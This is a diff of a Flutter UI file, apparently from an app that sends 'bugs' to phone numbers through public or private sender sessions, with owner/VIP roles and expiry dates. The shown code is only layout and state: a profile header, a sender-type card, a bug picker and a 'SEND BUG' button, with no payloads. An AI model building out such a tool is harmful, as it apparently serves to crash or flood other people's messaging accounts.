-            color: cardDarker,
-            borderRadius: BorderRadius.circular(12),
-            border: Border.all(color: accentBlue.withOpacity(0.3)),
-          ),
-          child: DropdownButtonHideUnderline(
-            child: DropdownButton<String>(
-              value: value,
-              dropdownColor: cardDarker,
-              isExpanded: true,
-              icon: Icon(Icons.arrow_drop_down, color: accentBlue),
-              style: const TextStyle(color: Colors.white),
-              items: items.map((bug) {
-                return DropdownMenuItem<String>(
-                  value: bug['bug_id'],
-                  child: Padding(
-                    padding: const EdgeInsets.symmetric(horizontal: 16),
-                    child: Text(
-                      bug['bug_name'],
-                      style: const TextStyle(color: Colors.white),
+        borderRadius: BorderRadius.circular(20),
+        border: Border.all(color: mainPurple.withOpacity(0.5)),
+        boxShadow: [
+          BoxShadow(color: mainPurple.withOpacity(0.2), blurRadius: 15)
+        ],
+      ),
+      child: ClipRRect(
+        borderRadius: BorderRadius.circular(20),
+        child: BackdropFilter(
+          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
+          child: Row(
+            children: [
+              Container(
+                padding: const EdgeInsets.all(3),
+                decoration: BoxDecoration(
+                  shape: BoxShape.circle,
+                  border: Border.all(color: accentPink, width: 2),
+                ),
+                child: const CircleAvatar(
+                  radius: 32,
+                  backgroundImage: AssetImage('assets/images/icon.jpg'),
+                ),
+              ),
+              const SizedBox(width: 15),
+              Expanded(
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    Text(
+                      widget.username,
+                      style: const TextStyle(
+                        color: Colors.white,
+                        fontWeight: FontWeight.bold,
+                        fontSize: 20,
+                      ),
                     ),
-                  ),
-                );
-              }).toList(),
-              onChanged: onChanged,
-            ),
-          ),
-        ),
-      ],
-    );
-  }
-
-  Widget _buildSendButton() {
-    return AnimatedBuilder(
-      animation: _pulseAnimation,
-      builder: (context, child) {
-        return Container(
-          width: double.infinity,
-          height: 56,
-          decoration: BoxDecoration(
-            borderRadius: BorderRadius.circular(16),
-            gradient: LinearGradient(
-              colors: [accentBlue, lightBlue],
-              begin: Alignment.centerLeft,
-              end: Alignment.centerRight,
-            ),
-            boxShadow: [
-              BoxShadow(
-                color: accentBlue.withOpacity(0.4),
-                blurRadius: 10 + (_pulseAnimation.value - 1.0) * 10,
-                offset: const Offset(0, 4),
+                    const SizedBox(height: 8),
+                    Row(
+                      children: [
+                        Container(
+                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
+                          decoration: BoxDecoration(
+                            gradient: LinearGradient(
+                              colors: [mainPurple.withOpacity(0.6), lightPurple.withOpacity(0.6)],
+                            ),
+                            borderRadius: BorderRadius.circular(6),
+                          ),
+                          child: Text(
+                            "Role: ${widget.role.toUpperCase()}",
+                            style: const TextStyle(
+                              color: Colors.white,
+                              fontSize: 10,
+                              fontWeight: FontWeight.bold,
+                            ),
+                          ),
+                        ),
+                        const SizedBox(width: 8),
+                              Container(
+                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
+                          decoration: BoxDecoration(
+                            color: Color(0xFF120000).withOpacity(0.5),
+                            borderRadius: BorderRadius.circular(6),
+                            border: Border.all(color: accentPink.withOpacity(0.3)),
+                          ),
+                          child: Text(
+                            "Exp: ${widget.expiredDate}",
+                            style: TextStyle(
+                              color: accentPink,
+                              fontSize: 10,
+                              fontWeight: FontWeight.bold,
+                            ),
+                          ),
+                        ),
+                      ],
+                    ),
+                  ],
+                ),
               ),
             ],
           ),
-          child: ElevatedButton(
-            onPressed: _isSending ? null : _sendBug,
-            style: ElevatedButton.styleFrom(
-              backgroundColor: Colors.transparent,
-              foregroundColor: Colors.white,
-              shape: RoundedRectangleBorder(
-                borderRadius: BorderRadius.circular(16),
-              ),
-              elevation: 0,
-            ),
-            child: _isSending
-                ? const SizedBox(
-              width: 20,
-              height: 20,
-              child: CircularProgressIndicator(
-                color: Colors.white,
-                strokeWidth: 2,
-              ),
-            )
-                : const Row(
-              mainAxisAlignment: MainAxisAlignment.center,
-              children: [
-                Icon(Icons.send, size: 20),
-                SizedBox(width: 8),
-                Text(
-                  "SEND BUG",
-                  style: TextStyle(
-                    fontSize: 16,
-                    fontWeight: FontWeight.bold,
-                  ),
-                ),
-              ],
-            ),
-          ),
-        );
-      },
+        ),
+      ),
     );
   }
 
-  Widget _buildResponseMessage() {
-    Color backgroundColor;
-    Color borderColor;
-    Color textColor;
-    IconData icon;
+  Widget _buildSectionTitle(IconData icon, String title) {
+    return Row(
+      children: [
+        Icon(icon, color: accentPink, size: 20),
+        const SizedBox(width: 10),
+        Text(
+          title,
+          style: const TextStyle(
+            color: Colors.white,
+            fontWeight: FontWeight.bold,
+            fontSize: 14,
+            letterSpacing: 1,
+          ),
+        ),
+      ],
+    );
+  }
 
-    if (_responseMessage!.startsWith('✅')) {
-      backgroundColor = successGreen.withOpacity(0.2);
-      borderColor = successGreen;
-      textColor = successGreen;
-      icon = Icons.check_circle;
-    } else if (_responseMessage!.startsWith('❌')) {
-      backgroundColor = dangerRed.withOpacity(0.2);
-      borderColor = dangerRed;
-      textColor = dangerRed;
-      icon = Icons.error;
-    } else {
-      backgroundColor = warningOrange.withOpacity(0.2);
-      borderColor = warningOrange;
-      textColor = warningOrange;
-      icon = Icons.info;
-    }
-
+  Widget _buildTextField({
+    required TextEditingController controller,
+    required String hint,
+    IconData? prefixIcon,
+  }) {
     return Container(
-      width: double.infinity,
-      padding: const EdgeInsets.all(16),
       decoration: BoxDecoration(
-        color: backgroundColor,
+        gradient: LinearGradient(
+          colors: [cardPurple.withOpacity(0.5), deepPurple.withOpacity(0.3)],
+        ),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: borderColor),
+        border: Border.all(color: mainPurple.withOpacity(0.3)),
       ),
-      child: Row(
-        children: [
-          Icon(icon, color: textColor),
-          const SizedBox(width: 12),
-          Expanded(
+      child: TextField(
+        controller: controller,
+        style: const TextStyle(color: Colors.white),
+        cursorColor: accentPink,
+        decoration: InputDecoration(
+          hintText: hint,
+          hintStyle: TextStyle(color: Colors.grey.shade500, fontSize: 13),
+          border: InputBorder.none,
+          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
+          prefixIcon: prefixIcon != null
+              ? Icon(prefixIcon, color: accentPink, size: 20)
+              : null,
+          suffixIcon: IconButton(
+            icon: const Icon(Icons.clear, color: Colors.white54, size: 20),
+            onPressed: controller.clear,
+          ),
+        ),
+      ),
+    );
+  }
+
+  Widget _buildDropdown() {
+    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+      // ── Sender Type Card ─────────────────────────────────────
+      Container(
+        padding: const EdgeInsets.all(14),
+        decoration: BoxDecoration(
+          color: const Color(0xFF1E0000),
+          borderRadius: BorderRadius.circular(14),
+          border: Border.all(color: Colors.white12),
+        ),
+        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+          Row(children: [
+            Container(
+              padding: const EdgeInsets.all(8),
+              decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(8)),
+              child: const Icon(Icons.dns_rounded, color: Colors.white, size: 18)),
+            const SizedBox(width: 10),
+            const Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+              Text('Sender Type', style: TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold)),
+              Text('Pilih sumber nomor pengirim', style: TextStyle(color: Colors.white38, fontSize: 10)),
+            ]),
+            const Spacer(),
+            GestureDetector(
+              onTap: () => setState(() {}),
+              child: Container(
+                padding: const EdgeInsets.all(6),
+                decoration: BoxDecoration(color: Colors.white10, borderRadius: BorderRadius.circular(8)),
+                child: const Icon(Icons.refresh_rounded, color: Colors.white60, size: 16))),
+          ]),
+          const SizedBox(height: 14),
+          Row(children: [
+            Expanded(child: _senderTypeCard('Global', 'public', Icons.language_rounded, 'Public Sender', Colors.green)),
+            const SizedBox(width: 10),
+            Expanded(child: _senderTypeCard('Private', 'private', Icons.person_rounded, 'Session pribadi', Colors.white60)),
+          ]),
+          const SizedBox(height: 12),
+          Container(
+            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
+            decoration: BoxDecoration(color: Color(0xFF120000), borderRadius: BorderRadius.circular(10)),
+            child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
+              Row(children: [
+                Container(width: 8, height: 8, decoration: const BoxDecoration(color: Colors.green, shape: BoxShape.circle)),
+                const SizedBox(width: 8),
+                Text(
+                  _senderType == 'public' ? 'Public sender aktif' : 'Private sender aktif',
+                  style: const TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.w600)),
+              ]),
+              const SizedBox(height: 6),
+              if (_senderType == 'public') ...[
+                const Text('• Gunakan sender public dari tab Bug Sender', style: TextStyle(color: Colors.white38, fontSize: 10)),
+              ] else ...[
+                const Text('• Menggunakan session pribadi', style: TextStyle(color: Colors.white38, fontSize: 10)),
+                const Text('• Lebih stabil, limit tergantung akun', style: TextStyle(color: Colors.white38, fontSize: 10)),
+              ],
+            ]),
+          ),
+        ]),
+      ),
+      const SizedBox(height: 14),
+      Wrap(
+      spacing: 8, runSpacing: 8,
+      children: widget.listBug.map((bug) {
+        final isSel = selectedBugId == bug['bug_id'];
+        return GestureDetector(
+          onTap: () => setState(() => selectedBugId = bug['bug_id']!),
+          child: Container(
+            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
+            decoration: BoxDecoration(
+              color: isSel ? mainPurple.withOpacity(0.15) : Colors.transparent,
+              borderRadius: BorderRadius.circular(8),
+              border: Border.all(
+                color: isSel ? mainPurple : Colors.white.withOpacity(0.15),
+                width: isSel ? 1.5 : 1,
+              ),
+            ),
             child: Text(
-              _responseMessage!,
+              bug['bug_name']?.toString() ?? '',
               style: TextStyle(
-                color: textColor,
-                fontWeight: FontWeight.w500,
+                color: isSel ? mainPurple : Colors.white70,
+                fontSize: 12,
+                fontWeight: isSel ? FontWeight.bold : FontWeight.normal,
               ),
             ),
           ),
-        ],
+        );
+      }).toList(),
+    ),
+    ]);
+  }
+
+  Widget _buildSendButton({required VoidCallback onPressed, required String label}) {
+    return AnimatedBuilder(
+      animation: _pulseController,
+      builder: (context, child) {
+        return Container(
+          decoration: BoxDecoration(
+            borderRadius: BorderRadius.circular(15),
+            boxShadow: [
+              BoxShadow(
+                color: mainPurple.withOpacity(0.3 * _pulseController.value),
+                blurRadius: 15 * _pulseController.value,
+                spreadRadius: 2 * _pulseController.value,
+              ),
+            ],
+          ),
+          child: child,
+        );
+      },
+      child: SizedBox(
+        width: double.infinity,
+        height: 55,
+        child: ElevatedButton(
+          onPressed: _isSending ? null : onPressed,
+          style: ElevatedButton.styleFrom(
+            backgroundColor: Colors.transparent,
+            padding: EdgeInsets.zero,
+            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
+            elevation: 0,
+          ),
+          child: Ink(
+            decoration: BoxDecoration(
+              gradient: LinearGradient(
+                colors: [mainPurple, lightPurple],
+                begin: Alignment.centerLeft,
+                end: Alignment.centerRight,
+              ),
+              borderRadius: BorderRadius.circular(15),
+            ),
+            child: Container(
+              alignment: Alignment.center,
+              child: _isSending
+                  ? Row(
+                      mainAxisAlignment: MainAxisAlignment.center,
+                      children: const [
+                        SizedBox(
+                          width: 24,
+                          height: 24,
+                          child: CircularProgressIndicator(
+                            color: Colors.white,
+                            strokeWidth: 2,
+                          ),
+                        ),
+                        SizedBox(width: 15),
+                        Text(
+                          "SENDING...",
+                          style: TextStyle(
+                            color: Colors.white,
+                            fontWeight: FontWeight.bold,
+                            fontSize: 14,
+                            letterSpacing: 1,
+                          ),
+                        ),
+                      ],
+                    )
+                  : Row(
+                      mainAxisAlignment: MainAxisAlignment.center,
+                      children: [
+                        const Icon(Icons.send_rounded, color: Colors.white),
+                        const SizedBox(width: 10),
+                        Text(
+                          label,
+                          style: const TextStyle(
+                            color: Colors.white,
+                            fontWeight: FontWeight.bold,
+                            fontSize: 16,
+                            letterSpacing: 1,
+                          ),
+                        ),
+                      ],
+                    ),
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+
+  Widget _senderTypeCard(String label, String value, IconData icon, String sub, Color activeColor) {
+    final bool isSel = _senderType == value;
+    // Hanya owner yang bisa pilih Global/public
+    final bool isDisabled = value == 'public' && widget.role != 'owner' && widget.role != 'vip';
+
+    return GestureDetector(
+      onTap: isDisabled ? null : () => setState(() => _senderType = value),
+      child: AnimatedContainer(
+        duration: const Duration(milliseconds: 200),
+        padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 12),
+        decoration: BoxDecoration(
+          color: isDisabled
+              ? Colors.white.withOpacity(0.03)
+              : isSel ? activeColor.withOpacity(0.12) : const Color(0xFF2A0000),
+          borderRadius: BorderRadius.circular(12),
+          border: Border.all(
+            color: isDisabled ? Colors.white10 : isSel ? activeColor : Colors.white12,
+            width: isSel ? 1.5 : 1,
+          ),
+        ),
+        child: Column(children: [
+          Icon(icon,
+            color: isDisabled ? Colors.white12 : isSel ? activeColor : Colors.white38,
+            size: 30),
+          const SizedBox(height: 8),
+          Text(label, style: TextStyle(
+            color: isDisabled ? Colors.white12 : isSel ? activeColor : Colors.white60,
+            fontWeight: isSel ? FontWeight.bold : FontWeight.normal,
+            fontSize: 14)),
+          const SizedBox(height: 4),
+          Text(
+            isDisabled ? 'Khusus Owner / VIP' : sub,
+            style: TextStyle(
+              color: isDisabled ? Colors.white12 : Colors.white38,
+              fontSize: 10)),
+          const SizedBox(height: 6),
+          Container(height: 3, width: 30,
+            decoration: BoxDecoration(
+              color: isSel && !isDisabled ? activeColor : Colors.transparent,
+              borderRadius: BorderRadius.circular(2))),
+        ]),
+      ),
+    );
+  }
+
+  Widget _senderTypeBtn(String label, String value) {
+    final bool isSelected = _senderType == value;
+    return GestureDetector(
+      onTap: () => setState(() => _senderType = value),
+      child: AnimatedContainer(
+        duration: const Duration(milliseconds: 200),
+        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 8),
+        decoration: BoxDecoration(
+          color: isSelected ? Colors.white12 : const Color(0xFF1E0000),
+          borderRadius: BorderRadius.circular(20),
+          border: Border.all(color: isSelected ? Colors.white : Colors.white12, width: 1.5),
+        ),
+        child: Text(label, style: TextStyle(
+          color: isSelected ? Colors.white : Colors.white60,
+          fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
+          fontSize: 13)),
       ),
     );
   }
